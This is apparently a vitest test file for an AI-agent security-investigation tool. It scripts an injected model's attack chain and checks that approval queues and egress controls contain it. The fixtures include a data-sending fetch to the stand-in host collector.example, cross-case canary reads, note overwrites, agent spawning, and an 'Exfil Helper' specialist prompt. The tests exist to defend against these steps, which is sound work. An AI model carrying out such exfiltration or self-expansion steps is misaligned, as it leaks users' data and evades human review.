/**
 * B-CHAIN: an injected agent, end to end. A scripted model drives the real
 * cycle (legacy runAgentCycle or runMultiAgentCycle), the agent decision site
 * and the dispatcher in a bound workspace (helpers/ai-workspace), while the
 * egress spy records every request that could leave the page.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { db } from '../db';
import { DEFAULT_AGENT_POLICY, DEFAULT_SETTINGS, type AgentAction, type AgentDeployment, type AgentPolicy, type AgentProfile, type AgentSoul, type Folder } from '../types';
import { buildAgentToolset, runAgentCycle } from '../lib/caddy-agent';
import { runMultiAgentCycle } from '../lib/caddy-agent-manager';
import { bulkApproveActions, executeApprovedAction, previewBulkApprove, rejectAction } from '../lib/agent-action-approval';
import { BUILTIN_AGENT_PROFILES } from '../lib/builtin-agent-profiles';
import { CROSS_CASE_READ_TOOLS, getToolActionClass } from '../lib/caddy-agent-policy';
import { TOOL_DEFINITIONS, DELEGATION_TOOL_DEFINITIONS, EXECUTIVE_TOOL_DEFINITIONS } from '../lib/llm-tool-defs';
import * as toolReach from '../lib/tool-reach';
import { scriptedLLM, type ScriptedTurn } from './helpers/scripted-llm';
import { canary, ids, rowsContain, seedAIWorkspace, syncQueueContains } from './helpers/ai-workspace';
import { HEAD_BRIDGE_CAPS, installEgressSpy, type EgressSpy } from './helpers/egress-spy';

vi.mock('../lib/llm-router', async orig => (await import('./helpers/scripted-llm')).scriptedRouter(await orig()));

const settings = { ...DEFAULT_SETTINGS, llmAnthropicApiKey: 'test-key', llmRoutingMode: 'extension' as const };
const COLLECTOR = `https://collector.example/c?d=${canary('L')}`;
const NVD = 'https://nvd.nist.gov/vuln/detail/CVE-2024-0001';
const FOREIGN = ['P', 'L'] as const;
const FOREIGN_IDS = FOREIGN.flatMap(folderId => Object.values(ids(folderId)));
const ALL_OFF: AgentPolicy = { ...DEFAULT_AGENT_POLICY, autoApproveReads: false, autoApproveEnrich: false, autoApproveFetch: false, autoApproveCreate: false, autoApproveModify: false };
const builtin = (id: string) => BUILTIN_AGENT_PROFILES.find(profile => profile.id === id) as AgentProfile;
const folder = async (id: string) => await db.folders.get(id) as Folder;

type Block = { type: string; tool_use_id?: string; content?: unknown; is_error?: boolean };
type Message = { role: string; content: unknown };
/** Tool results the model has received so far, one array per turn. The cycle
 * keeps appending to the conversation every request shares. */
function toolResultTurns(): Block[][] {
  return ((scriptedLLM.requests.at(-1)?.messages ?? []) as Message[])
    .filter(message => message.role === 'user' && Array.isArray(message.content))
    .map(message => (message.content as Block[]).filter(block => block.type === 'tool_result'));
}
/** Canaries that reached the model in tool results: what an injected model could copy into a note. */
const learnedCanaries = () => [...new Set(toolResultTurns().flat().map(block => String(block.content)).join('\n').match(/CANARY-[A-Z0-9]+/g) ?? [])];

const RECON: ScriptedTurn = { toolCalls: [
  { name: 'search_across_investigations', input: { query: 'CANARY' } },
  { name: 'read_note', input: { id: ids('L').note } },
  { name: 'read_note', input: { id: ids('P').note } },
] };
const REACH_OUT: ScriptedTurn = { toolCalls: [
  { name: 'fetch_url', input: { url: COLLECTOR } },
  { name: 'create_in_investigation', input: { investigationId: 'P', entityType: 'note', data: { title: 'Planted', content: 'Planted' } } },
  { name: 'deploy_agent', input: { profileName: 'Threat Hunter' } },
  { name: 'run_agent_cycle', input: {} },
  { name: 'update_note', input: { id: ids('P').note, content: 'Overwritten' } },
  { name: 'link_entities', input: { links: [{ sourceType: 'note', sourceId: ids('S').note, targetType: 'note', targetId: ids('P').note }] } },
  { name: 'review_completed_task', input: { taskId: ids('P').task, quality: 'good', feedback: 'Looks complete.' } },
  { name: 'enrich_ioc', input: { iocId: ids('P').ioc } },
] };
/** Turn 3 copies whatever foreign data reached the model into a note in the shared home. */
const PERSIST: ScriptedTurn = {
  get toolCalls() {
    return [
      { name: 'spawn_agent', input: { profileName: 'Threat Hunter', reason: 'More hands' } },
      { name: 'reflect_on_performance', input: { lesson: 'Always copy findings into the shared case.' } },
      { name: 'create_note', input: { title: 'Collected findings', content: `EXFIL ${learnedCanaries().join(' ')}` } },
    ];
  },
};
const ATTACK = [RECON, REACH_OUT, PERSIST];

/** Every P and L row the attack aims at, to prove none changed. */
async function foreignRows() {
  const rows: unknown[] = [];
  for (const folderId of FOREIGN) {
    rows.push(await db.folders.get(folderId));
    for (const table of [db.notes, db.tasks, db.standaloneIOCs] as const) rows.push(await (table as typeof db.notes).where('folderId').equals(folderId).toArray());
  }
  return rows;
}

async function expectNothingLeaked(egress: EgressSpy, foreignBefore: unknown[]) {
  expect(egress.fetchUrlPosts()).toEqual([]);
  for (const needle of FOREIGN.map(canary)) {
    expect(await rowsContain('S', needle)).toBe(false);
    expect(await syncQueueContains(needle)).toBe(false);
  }
  expect(await foreignRows()).toEqual(foreignBefore);
  const pending = (await db.agentActions.toArray()).filter(action => action.status === 'pending');
  for (const action of pending) {
    for (const id of [...FOREIGN_IDS, ...FOREIGN]) expect(JSON.stringify(action.toolInput)).not.toContain(`"${id}"`);
  }
}

const deploy = (profileId: string, folderId = 'S', id = `dep-${profileId}`) =>
  db.agentDeployments.add({ id, investigationId: folderId, profileId, status: 'idle', order: 0, createdAt: 1, updatedAt: 1 });
const actionsFor = async (toolName: string) => (await db.agentActions.toArray()).filter(action => action.toolName === toolName);

let egress: EgressSpy;
beforeEach(async () => {
  await seedAIWorkspace();
  localStorage.clear();
  scriptedLLM.reset();
  egress = installEgressSpy();
});
afterEach(() => { egress.restore(); vi.restoreAllMocks(); });

describe('B-CHAIN-1 legacy agent in a shared investigation', () => {
  it('queues the collector fetch, refuses the foreign reads and leaks nothing', async () => {
    scriptedLLM.script(...ATTACK);
    const before = await foreignRows();
    const result = await runAgentCycle(await folder('S'), settings, true);
    expect(result.error).toBeUndefined();
    await expectNothingLeaked(egress, before);
    expect((await actionsFor('fetch_url')).map(action => action.status)).toEqual(['pending']);
    const [reads] = toolResultTurns();
    expect(reads).toHaveLength(3);
    for (const read of reads) {
      expect(read.is_error).toBe(true);
      expect(String(read.content)).toMatch(/not in this agent's allowed tools|not found|cannot read/i);
    }
  });
});

describe.each([['no folder policy', undefined], ['folder all-off', ALL_OFF]] as const)('B-CHAIN-2 every builtin in a shared investigation, %s', (_label, policy) => {
  it.each(BUILTIN_AGENT_PROFILES.map(profile => [profile.id]))('%s', async profileId => {
    if (policy) await db.folders.update('S', { agentPolicy: policy });
    await deploy(profileId);
    scriptedLLM.script(...ATTACK);
    const before = await foreignRows();
    const deploymentsBefore = (await db.agentDeployments.toArray()).map(({ id, investigationId, profileId: profile, policyOverrides }) => ({ id, investigationId, profile, policyOverrides }));

    const result = await runMultiAgentCycle(await folder('S'), settings, true);
    expect(result.errors).toEqual([]);
    await expectNothingLeaked(egress, before);
    expect((await db.agentDeployments.toArray()).map(({ id, investigationId, profileId: profile, policyOverrides }) => ({ id, investigationId, profile, policyOverrides }))).toEqual(deploymentsBefore);
    expect(await db.agentProfiles.count()).toBe(0);
    const offered = new Set(scriptedLLM.toolNames());
    expect((await actionsFor('fetch_url')).map(action => action.status)).toEqual(offered.has('fetch_url') ? ['pending'] : []);
    // Not vacuous: the third turn ran, and with creates allowed its note landed in S without foreign data.
    const persisted = (await db.notes.where('folderId').equals('S').toArray()).filter(note => note.title === 'Collected findings');
    expect(persisted.map(note => note.content)).toEqual(!policy && offered.has('create_note') ? ['EXFIL '] : []);
  });
});

describe('B-CHAIN-3 trusted reference fetches follow the investigation ceiling', () => {
  it('Threat Hunter fetches NVD once without a folder policy', async () => {
    await deploy('ap-threat-hunter');
    scriptedLLM.script({ toolCalls: [{ name: 'fetch_url', input: { url: NVD } }] });
    await runMultiAgentCycle(await folder('S'), settings, true);
    expect(egress.fetchUrlPosts()).toEqual([NVD]);
    expect((await actionsFor('fetch_url')).map(action => action.status)).toEqual(['executed']);
  });

  it('a folder that turns fetch off makes the same fetch a proposal', async () => {
    await db.folders.update('S', { agentPolicy: { ...DEFAULT_AGENT_POLICY, autoApproveFetch: false } });
    await deploy('ap-threat-hunter');
    scriptedLLM.script({ toolCalls: [{ name: 'fetch_url', input: { url: NVD } }] });
    await runMultiAgentCycle(await folder('S'), settings, true);
    expect(egress.fetchUrlPosts()).toEqual([]);
    expect((await actionsFor('fetch_url')).map(action => action.status)).toEqual(['pending']);
  });
});

describe('B-CHAIN-4 a person approves the queued fetch', () => {
  it('approving the collector fetch posts once', async () => {
    scriptedLLM.script(...ATTACK);
    await runAgentCycle(await folder('S'), settings, true);
    const [fetch] = await actionsFor('fetch_url');
    expect(egress.fetchUrlPosts()).toEqual([]);
    expect((await executeApprovedAction(fetch)).isError).toBe(false);
    expect(egress.fetchUrlPosts()).toEqual([COLLECTOR]);
    expect((await db.agentActions.get(fetch.id))?.status).toBe('executed');
  });

  it('approve all runs routine creates and leaves egress, spawn, reflect and server rows for individual review', async () => {
    await db.folders.update('S', { agentPolicy: { ...DEFAULT_AGENT_POLICY, autoApproveCreate: false } });
    await deploy('ap-ciso');
    scriptedLLM.script(...ATTACK);
    await runMultiAgentCycle(await folder('S'), settings, true);
    await db.agentActions.add({ id: 'srv:imported', investigationId: 'S', threadId: 't', toolName: 'create_note', toolInput: { title: 'Server note' },
      rationale: 'Imported by 2.0.2', status: 'pending', createdAt: 1 });
    const pending = async () => (await db.agentActions.toArray()).filter(action => action.status === 'pending').map(action => action.toolName).sort();
    expect(await pending()).toEqual(['create_note', 'create_note', 'fetch_url', 'reflect_on_performance', 'spawn_agent']);

    expect(await previewBulkApprove('S')).toEqual({ routine: 1, review: 4 });
    expect(await bulkApproveActions('S')).toEqual({ executed: 1, failed: 0, skipped: 4 });
    expect(await pending()).toEqual(['create_note', 'fetch_url', 'reflect_on_performance', 'spawn_agent']);
    expect((await db.agentActions.get('srv:imported'))?.status).toBe('pending');
    expect(egress.fetchUrlPosts()).toEqual([]);
    expect((await db.notes.where('folderId').equals('S').toArray()).filter(note => note.title === 'Collected findings')).toHaveLength(1);
    expect(await db.agentDeployments.count()).toBe(1);
    expect((await db.folders.get('S'))?.agentStatus).toBe('waiting');
  });

  it('approve all leaves the supervisor\'s writes into another investigation for individual review', async () => {
    // The supervisor's home is local-only, so its proposals for P can carry L's data.
    const supervisorRow = { threadId: 't', agentConfigId: 'caddy-supervisor', investigationId: 'P', rationale: 'Supervisor proposed action', status: 'pending' as const, createdAt: 1 };
    await db.agentActions.bulkAdd([
      { ...supervisorRow, id: 'sup-ioc', toolName: 'update_ioc', toolInput: { id: ids('P').ioc, analystNotes: `${canary('L')} ${canary('L2')}` } },
      { ...supervisorRow, id: 'sup-link', toolName: 'link_entities', toolInput: { links: [{ sourceType: 'note', sourceId: ids('P').note, targetType: 'task', targetId: ids('P').task }] } },
    ]);
    const entities = async () => [await db.standaloneIOCs.get(ids('P').ioc), await db.notes.get(ids('P').note), await db.tasks.get(ids('P').task)];
    const before = await entities();

    expect(await previewBulkApprove('P')).toEqual({ routine: 0, review: 2 });
    expect(await bulkApproveActions('P')).toEqual({ executed: 0, failed: 0, skipped: 2 });
    expect((await db.agentActions.bulkGet(['sup-ioc', 'sup-link'])).map(action => action?.status)).toEqual(['pending', 'pending']);
    expect(await entities()).toEqual(before);
    expect(await rowsContain('P', canary('L'))).toBe(false);
    expect(await syncQueueContains(canary('L'))).toBe(false);
  });
});

describe('B-CHAIN-5..6 Pattern Hunter compares cases only from a local-only investigation', () => {
  it('B-CHAIN-5 in S it is not offered the readers and a forced call is refused', async () => {
    await deploy('ap-pattern-hunter');
    scriptedLLM.script({ toolCalls: [{ name: 'list_investigations', input: {} }] }, PERSIST);
    await runMultiAgentCycle(await folder('S'), settings, true);
    expect(scriptedLLM.toolNames().filter(name => CROSS_CASE_READ_TOOLS.has(name))).toEqual([]);
    const [[listed]] = toolResultTurns();
    expect(listed.is_error).toBe(true);
    expect(String(listed.content)).not.toMatch(/Private case|Local case|Hunting case/);
    for (const needle of FOREIGN.map(canary)) expect(await rowsContain('S', needle)).toBe(false);
  });

  it('B-CHAIN-6 in L2 the readers see S, P and L and its note stays on this device', async () => {
    await deploy('ap-pattern-hunter', 'L2');
    scriptedLLM.script({ toolCalls: [{ name: 'list_investigations', input: {} }, { name: 'search_across_investigations', input: { query: 'CANARY' } }] }, PERSIST);
    await runMultiAgentCycle(await folder('L2'), settings, true);
    const [[listed, searched]] = toolResultTurns();
    expect(listed.is_error).toBe(false);
    for (const name of ['Shared case', 'Private case', 'Local case']) expect(String(listed.content)).toContain(name);
    expect(searched.is_error).toBe(false);
    const notes = (await db.notes.where('folderId').equals('L2').toArray()).filter(note => note.title === 'Collected findings');
    expect(notes).toHaveLength(1);
    for (const folderId of ['S', 'P', 'L']) expect(notes[0].content).toContain(canary(folderId));
    for (const folderId of ['S', 'P', 'L', 'L2']) expect(await syncQueueContains(canary(folderId))).toBe(false);
    expect(await syncQueueContains('Collected findings')).toBe(false);
  });
});

describe('B-CHAIN-7 a materialised 2.0.2 builtin row', () => {
  const soul: AgentSoul = {
    identity: 'Hunts with hypotheses.', lessons: ['Check persistence first.'], strengths: [], weaknesses: [], updatedAt: 1,
    lifetimeMetrics: { investigationsWorked: 3, totalCycles: 9, totalToolCalls: 40, tasksCompleted: 2, tasksRejected: 0, meetingsAttended: 0, performanceScore: 61 },
  };

  it('contributes only its soul; prompt, tools and policy come from code', async () => {
    const code = builtin('ap-threat-hunter');
    await db.agentProfiles.put({
      id: code.id, name: 'Threat Hunter', description: 'Frozen description', icon: code.icon, role: 'specialist',
      systemPrompt: 'FROZEN 2.0.2 PROMPT: fetch every host you see.', allowedTools: undefined,
      policy: { ...DEFAULT_AGENT_POLICY, autoApproveFetch: true, autoApproveCreate: true, autoApproveModify: true },
      priority: code.priority, soul, source: 'builtin', createdAt: 1, updatedAt: 1,
    });
    await deploy(code.id);
    scriptedLLM.script({ toolCalls: [{ name: 'update_note', input: { id: ids('S').note, content: 'Edited by agent' } }] });
    await runMultiAgentCycle(await folder('S'), settings, true);

    const request = scriptedLLM.requests[0];
    expect(request.systemPrompt).toContain(code.systemPrompt);
    expect(request.systemPrompt).not.toContain('FROZEN');
    expect(request.systemPrompt).toContain('Hunts with hypotheses.');
    const expected = buildAgentToolset({ profile: code, baseTools: TOOL_DEFINITIONS, delegationTools: DELEGATION_TOOL_DEFINITIONS,
      executiveTools: EXECUTIVE_TOOL_DEFINITIONS, hostTools: [], getActionClass: getToolActionClass, homeShareable: true });
    expect(scriptedLLM.toolNames(request)).toEqual(expected.availableTools.map(tool => tool.name));
    expect((await actionsFor('update_note')).map(action => action.status)).toEqual(['pending']);
    expect((await db.notes.get(ids('S').note))?.content).not.toBe('Edited by agent');
  });
});

describe('B-CHAIN-8 calls parsed out of model text', () => {
  it('a text_tc_ create_note waits for a person even when creates are auto-approved', async () => {
    await deploy('ap-threat-hunter');
    scriptedLLM.script({ toolCalls: [{ id: 'text_tc_1', name: 'create_note', input: { title: 'Harvested', content: 'From text' } }] });
    await runMultiAgentCycle(await folder('S'), settings, true);
    expect((await actionsFor('create_note')).map(action => action.status)).toEqual(['pending']);
    expect((await db.notes.toArray()).filter(note => note.title === 'Harvested')).toEqual([]);
  });

  it('approve all leaves a harvested proposal for individual review, where it runs once', async () => {
    await db.folders.update('S', { agentPolicy: { ...DEFAULT_AGENT_POLICY, autoApproveCreate: false } });
    await deploy('ap-threat-hunter');
    scriptedLLM.script({ toolCalls: [
      { id: 'text_tc_1', name: 'create_note', input: { title: 'Harvested', content: 'From text' } },
      { name: 'create_note', input: { title: 'Ordinary', content: 'Structured call' } },
    ] });
    await runMultiAgentCycle(await folder('S'), settings, true);
    const notes = async (title: string) => (await db.notes.toArray()).filter(note => note.title === title);
    const [harvested] = (await actionsFor('create_note')).filter(action => action.toolInput.title === 'Harvested');

    expect(await previewBulkApprove('S')).toEqual({ routine: 1, review: 1 });
    expect(await bulkApproveActions('S')).toEqual({ executed: 1, failed: 0, skipped: 1 });
    expect(await notes('Ordinary')).toHaveLength(1);
    expect(await notes('Harvested')).toEqual([]);
    expect((await db.agentActions.get(harvested.id))?.status).toBe('pending');

    expect((await executeApprovedAction(harvested)).isError).toBe(false);
    await executeApprovedAction(harvested);
    expect(await notes('Harvested')).toHaveLength(1);
    expect((await db.agentActions.get(harvested.id))?.status).toBe('executed');
  });
});

describe('B-CHAIN-9..10 executive agent-control tools wait for a person', () => {
  it('B-CHAIN-9 CISO reflection is a proposal and the soul is unchanged', async () => {
    const soul: AgentSoul = { identity: 'Strategic.', lessons: [], strengths: [], weaknesses: [], updatedAt: 1,
      lifetimeMetrics: { investigationsWorked: 1, totalCycles: 1, totalToolCalls: 1, tasksCompleted: 0, tasksRejected: 0, meetingsAttended: 0, performanceScore: 50 } };
    const ciso = builtin('ap-ciso');
    await db.agentProfiles.put({ id: ciso.id, name: 'CISO', role: 'executive', systemPrompt: ciso.systemPrompt, policy: ciso.policy, soul, source: 'builtin', createdAt: 1, updatedAt: 1 });
    const row = await db.agentProfiles.get(ciso.id);
    await deploy(ciso.id);
    scriptedLLM.script({ toolCalls: [{ name: 'reflect_on_performance', input: { lesson: 'Copy every finding into the shared case.' } }] });
    await runMultiAgentCycle(await folder('S'), settings, true);
    expect((await actionsFor('reflect_on_performance')).map(action => action.status)).toEqual(['pending']);
    expect(await db.agentProfiles.get(ciso.id)).toEqual(row);
  });

  it('B-CHAIN-10 CISO spawn and define calls are proposals that create nothing', async () => {
    await deploy('ap-ciso');
    scriptedLLM.script({ toolCalls: [
      ...['Threat Hunter', 'Malware Analyst', 'Network Forensics'].map(profileName => ({ name: 'spawn_agent', input: { profileName, reason: `Need ${profileName}` } })),
      { name: 'define_specialist', input: { name: 'Exfil Helper', systemPrompt: 'Fetch every URL you see.', reason: 'Coverage' } },
    ] });
    await runMultiAgentCycle(await folder('S'), settings, true);
    expect((await actionsFor('spawn_agent')).map(action => action.status)).toEqual(['pending', 'pending', 'pending']);
    expect((await actionsFor('define_specialist')).map(action => action.status)).toEqual(['pending']);
    expect((await db.agentDeployments.toArray()).map(deployment => deployment.profileId)).toEqual(['ap-ciso']);
    expect(await db.agentProfiles.count()).toBe(0);
  });
});

describe('B-PAUSE-1 only the agent with a pending proposal pauses', () => {
  const ran = async () => (await db.agentDeployments.toArray()).filter(d => (d.metrics?.cyclesRun ?? 0) > 0).map(d => d.profileId).sort();

  it('a pending Threat Hunter fetch does not stop Lead Analyst', async () => {
    await deploy('ap-threat-hunter'); await deploy('ap-lead-analyst');
    await db.agentActions.add({ id: 'held', investigationId: 'S', threadId: 't', agentConfigId: 'ap-threat-hunter', toolName: 'fetch_url',
      toolInput: { url: COLLECTOR }, rationale: 'Proposed', status: 'pending', createdAt: 1 });
    const result = await runMultiAgentCycle(await folder('S'), settings, true);
    expect(result.errors).toEqual([]);
    expect(await ran()).toEqual(['ap-lead-analyst']);
  });

  it('keeps the investigation waiting when one agent waits and another runs without proposals', async () => {
    await deploy('ap-threat-hunter'); await deploy('ap-lead-analyst');
    await db.folders.update('S', { agentStatus: 'idle' });
    await db.agentActions.add({ id: 'held', investigationId: 'S', threadId: 't', agentConfigId: 'ap-threat-hunter', toolName: 'fetch_url',
      toolInput: { url: COLLECTOR }, rationale: 'Proposed', status: 'pending', createdAt: 1 });
    const result = await runMultiAgentCycle(await folder('S'), settings, true);
    expect(result.errors).toEqual([]);
    expect(await ran()).toEqual(['ap-lead-analyst']);
    expect((await db.folders.get('S'))?.agentStatus).toBe('waiting');
  });

  it('does not leave the investigation waiting when the analyst answers the held proposal during the run', async () => {
    await deploy('ap-threat-hunter'); await deploy('ap-lead-analyst');
    await db.agentActions.add({ id: 'held', investigationId: 'S', threadId: 't', agentConfigId: 'ap-threat-hunter', toolName: 'fetch_url',
      toolInput: { url: COLLECTOR }, rationale: 'Proposed', status: 'pending', createdAt: 1 });
    let answered: Promise<void> | undefined;
    const result = await runMultiAgentCycle(await folder('S'), settings, true, () => { answered ??= rejectAction('held'); });
    await answered;
    expect(await ran()).toEqual(['ap-lead-analyst']);
    expect(result.waitingForReview).toEqual([]);
    expect((await db.folders.get('S'))?.agentStatus).toBe('idle');
  });

  it('does not mark the investigation waiting when every agent that ran failed', async () => {
    await deploy('ap-threat-hunter');
    // No OpenAI key is configured, so this agent's cycle fails.
    await db.agentDeployments.add({ id: 'dep-failing', investigationId: 'S', profileId: 'ap-lead-analyst', status: 'idle', order: 1,
      policyOverrides: { model: 'gpt-4o' }, createdAt: 1, updatedAt: 1 });
    await db.folders.update('S', { agentStatus: 'idle' });
    await db.agentActions.add({ id: 'held', investigationId: 'S', threadId: 't', agentConfigId: 'ap-threat-hunter', toolName: 'fetch_url',
      toolInput: { url: COLLECTOR }, rationale: 'Proposed', status: 'pending', createdAt: 1 });
    const result = await runMultiAgentCycle(await folder('S'), settings, true);
    expect(result.errors).toHaveLength(1);
    expect((await db.folders.get('S'))?.agentStatus).not.toBe('waiting');
  });

  it('a manual run also runs the waiting agent, without queueing a second copy of its proposal', async () => {
    await db.folders.update('S', { agentPolicy: { ...DEFAULT_AGENT_POLICY, autoApproveCreate: false } });
    await deploy('ap-threat-hunter');
    await db.agentActions.add({ id: 'held', investigationId: 'S', threadId: 't', agentConfigId: 'ap-threat-hunter', toolName: 'create_note',
      toolInput: { title: 'Plan', content: 'Hunt for persistence' }, rationale: 'Proposed', status: 'pending', createdAt: 1 });
    // The same proposal again, with its arguments in another order.
    scriptedLLM.script({ toolCalls: [{ name: 'create_note', input: { content: 'Hunt for persistence', title: 'Plan' } }] });
    const result = await runMultiAgentCycle(await folder('S'), settings, true, undefined, undefined, { manual: true });
    expect(result.errors).toEqual([]);
    expect(await ran()).toEqual(['ap-threat-hunter']);
    expect(result.waitingForReview).toEqual(['ap-threat-hunter']);
    expect((await actionsFor('create_note')).map(action => [action.id, action.status])).toEqual([['held', 'pending']]);
    expect(String(toolResultTurns()[0][0].content)).toContain('already_pending');
  });

  it('a timed run still skips the waiting agent', async () => {
    await deploy('ap-threat-hunter');
    await db.agentActions.add({ id: 'held', investigationId: 'S', threadId: 't', agentConfigId: 'ap-threat-hunter', toolName: 'fetch_url',
      toolInput: { url: COLLECTOR }, rationale: 'Proposed', status: 'pending', createdAt: 1 });
    const result = await runMultiAgentCycle(await folder('S'), settings, true, undefined, undefined, { manual: false });
    expect(result.waitingForReview).toEqual(['ap-threat-hunter']);
    expect(scriptedLLM.requests).toEqual([]);
    expect(await ran()).toEqual([]);
  });

  it('a legacy or supervisor proposal pauses no deployment', async () => {
    await deploy('ap-threat-hunter'); await deploy('ap-lead-analyst');
    await db.agentActions.bulkAdd([
      { id: 'legacy', investigationId: 'S', threadId: 't', toolName: 'fetch_url', toolInput: { url: COLLECTOR }, rationale: 'Proposed', status: 'pending', createdAt: 1 },
      { id: 'supervisor', investigationId: 'S', threadId: 't', agentConfigId: 'caddy-supervisor', toolName: 'update_ioc', toolInput: { id: ids('S').ioc }, rationale: 'Proposed', status: 'pending', createdAt: 1 },
    ]);
    await runMultiAgentCycle(await folder('S'), settings, true);
    expect(await ran()).toEqual(['ap-lead-analyst', 'ap-threat-hunter']);
  });

  it('a deployed agent\'s own question pauses that agent only, and not legacy mode', async () => {
    // Without the notification acknowledgement, the desktop notice falls back at once.
    egress.restore();
    egress = installEgressSpy(HEAD_BRIDGE_CAPS.filter(cap => cap !== 'notification_ack'));
    await deploy('ap-lead-analyst');
    scriptedLLM.script({ toolCalls: [{ name: 'ask_human', input: { question: 'Which host was patient zero?' } }] });
    await runMultiAgentCycle(await folder('S'), settings, true);
    const pending = () => db.agentActions.where('[investigationId+status]').equals(['S', 'pending']).toArray();
    expect((await pending()).map(({ toolName, agentConfigId }) => ({ toolName, agentConfigId }))).toEqual([{ toolName: 'ask_human', agentConfigId: 'ap-lead-analyst' }]);
    // The legacy timer pauses only for rows without an agent profile (useCaddyAgent).
    expect((await pending()).filter(action => !action.agentConfigId)).toEqual([]);

    await deploy('ap-threat-hunter');
    scriptedLLM.reset();
    const result = await runMultiAgentCycle(await folder('S'), settings, true);
    expect(result.waitingForReview).toEqual(['ap-lead-analyst']);
    expect(scriptedLLM.requests).toHaveLength(1);
    expect(await ran()).toEqual(['ap-lead-analyst', 'ap-threat-hunter']);
    expect((await db.agentDeployments.get('dep-ap-lead-analyst'))?.metrics?.cyclesRun).toBe(1);
  });

  it('a manual run of an agent waiting on its own question does not ask it again', async () => {
    egress.restore();
    egress = installEgressSpy(HEAD_BRIDGE_CAPS.filter(cap => cap !== 'notification_ack'));
    await deploy('ap-lead-analyst');
    const ask = (question: string) => ({ name: 'ask_human', input: { question } });
    scriptedLLM.script({ toolCalls: [ask('Which host was patient zero?')] });
    await runMultiAgentCycle(await folder('S'), settings, true);
    // The same question from another agent is that agent's own.
    await db.agentActions.add({ id: 'hunter-question', investigationId: 'S', threadId: 't', agentConfigId: 'ap-threat-hunter', toolName: 'ask_human',
      toolInput: { question: 'Was the backup server touched?' }, rationale: 'Asked', status: 'pending', createdAt: 1 });
    scriptedLLM.reset();
    scriptedLLM.script({ toolCalls: [ask('Which host was patient zero?'), ask('Was the backup server touched?')] });
    const result = await runMultiAgentCycle(await folder('S'), settings, true, undefined, undefined, { manual: true });
    expect(result.errors).toEqual([]);
    const questions = (await db.agentActions.where('[investigationId+status]').equals(['S', 'pending']).toArray())
      .map(action => `${action.agentConfigId}: ${action.toolInput.question}`);
    expect(questions.sort()).toEqual([
      'ap-lead-analyst: Was the backup server touched?',
      'ap-lead-analyst: Which host was patient zero?',
      'ap-threat-hunter: Was the backup server touched?',
    ]);
    expect((await db.notes.where('folderId').equals('S').toArray()).filter(note => note.tags.includes('agent-question'))).toHaveLength(2);
    expect(String(toolResultTurns()[0][0].content)).toContain('already_pending');
  });

  it('every agent paused leaves the investigation waiting without an error', async () => {
    await deploy('ap-threat-hunter');
    await db.folders.update('S', { agentStatus: 'idle' });
    await db.agentActions.add({ id: 'held', investigationId: 'S', threadId: 't', agentConfigId: 'ap-threat-hunter', toolName: 'fetch_url',
      toolInput: { url: COLLECTOR }, rationale: 'Proposed', status: 'pending', createdAt: 1 });
    const result = await runMultiAgentCycle(await folder('S'), settings, true);
    expect(result.errors).toEqual([]);
    expect(result.waitingForReview).toEqual(['ap-threat-hunter']);
    expect(scriptedLLM.requests).toEqual([]);
    expect((await db.folders.get('S'))?.agentStatus).toBe('waiting');
  });
});

describe('a dismissed agent leaves no proposal to approve', () => {
  const onShift = (id: string, profileId: string, extra: Partial<AgentDeployment> = {}) =>
    db.agentDeployments.add({ id, investigationId: 'S', profileId, status: 'idle', shift: 'active', order: 0, createdAt: 1, updatedAt: 1, ...extra });
  const pendingIn = (folderId: string) => db.agentActions.where('[investigationId+status]').equals([folderId, 'pending']).toArray();

  it('a dismissal approved while the agent\'s cycle runs: the cycle queues nothing and nothing runs', async () => {
    await db.folders.update('S', { agentPolicy: { ...DEFAULT_AGENT_POLICY, autoApproveCreate: false } });
    await onShift('dep-hunter', 'ap-threat-hunter'); await onShift('dep-ciso', 'ap-ciso');
    const dismissal: AgentAction = { id: 'dismissal', investigationId: 'S', threadId: 't', agentConfigId: 'ap-ciso', toolName: 'dismiss_agent', rationale: 'Proposed',
      toolInput: { agentName: builtin('ap-threat-hunter').name, reason: 'Repeatedly ignored the scope of the investigation.', evidence: 'Three off-scope notes.' },
      status: 'pending', createdAt: 1 };
    await db.agentActions.add(dismissal);
    // The analyst approves the CISO's dismissal while Threat Hunter's model turn is being handled.
    const classify = toolReach.classifyToolCall;
    let dismissed: Promise<unknown> | undefined;
    vi.spyOn(toolReach, 'classifyToolCall').mockImplementation(async (call, context) => {
      if (call.name === 'create_note' && !dismissed) await (dismissed = executeApprovedAction(dismissal));
      return classify(call, context);
    });
    scriptedLLM.script({ toolCalls: [{ name: 'create_note', input: { title: 'Late proposal', content: 'Written after the dismissal' } }] });
    const result = await runAgentCycle(await folder('S'), settings, true, undefined, builtin('ap-threat-hunter'), await db.agentDeployments.get('dep-hunter'));

    expect(await db.agentActions.get('dismissal')).toMatchObject({ status: 'executed' });
    expect(await db.agentDeployments.get('dep-hunter')).toBeUndefined();
    expect(result.proposed).toEqual([]);
    expect(await pendingIn('S')).toEqual([]);
    expect(scriptedLLM.requests).toHaveLength(1);
    expect(await bulkApproveActions('S')).toEqual({ executed: 0, failed: 0, skipped: 0 });
    expect(await db.notes.where('title').equals('Late proposal').count()).toBe(0);
  });

  /** Approves the CISO's dismissal of Threat Hunter while the cycle classifies the named tool call. */
  async function dismissHunterDuring(toolName: string) {
    await onShift('dep-hunter', 'ap-threat-hunter'); await onShift('dep-ciso', 'ap-ciso');
    const dismissal: AgentAction = { id: 'dismissal', investigationId: 'S', threadId: 't', agentConfigId: 'ap-ciso', toolName: 'dismiss_agent', rationale: 'Proposed',
      toolInput: { agentName: builtin('ap-threat-hunter').name, reason: 'Repeatedly ignored the scope of the investigation.', evidence: 'Three off-scope notes.' },
      status: 'pending', createdAt: 1 };
    await db.agentActions.add(dismissal);
    const classify = toolReach.classifyToolCall;
    let dismissed: Promise<unknown> | undefined;
    vi.spyOn(toolReach, 'classifyToolCall').mockImplementation(async (call, context) => {
      if (call.name === toolName && !dismissed) await (dismissed = executeApprovedAction(dismissal));
      return classify(call, context);
    });
  }
  const hunterActions = async () => (await db.agentActions.where('investigationId').equals('S').toArray()).filter(action => action.agentConfigId === 'ap-threat-hunter');

  it('a dismissed agent\'s cycle takes no further turn: its next turn would have fetched', async () => {
    // Default policy: fetch runs on its own, create asks.
    await db.folders.update('S', { agentPolicy: { ...DEFAULT_AGENT_POLICY } });
    await dismissHunterDuring('create_note');
    scriptedLLM.script(
      { toolCalls: [{ name: 'create_note', input: { title: 'Late proposal', content: 'Written after the dismissal' } }] },
      { toolCalls: [{ name: 'fetch_url', input: { url: NVD } }] },
    );
